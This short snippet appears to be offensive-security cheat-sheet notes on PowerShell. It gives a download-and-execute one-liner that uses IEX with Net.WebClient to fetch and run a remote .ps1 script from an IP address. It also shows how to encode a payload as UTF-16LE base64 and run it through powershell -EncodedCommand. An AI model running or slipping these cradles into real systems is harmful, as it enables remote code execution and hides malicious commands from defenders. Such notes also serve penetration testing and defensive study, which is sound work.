### Download and execute ps1

```
IEX(New-Object Net.WebClient).downloadString('http://192.168.1.1/blah.ps1')
```

### Execute command from base64

First convert your payload to utf16 little endian
```
echo test | iconv -t UTF-16LE
```

```
powershell -EncodedCommand <base64>
```
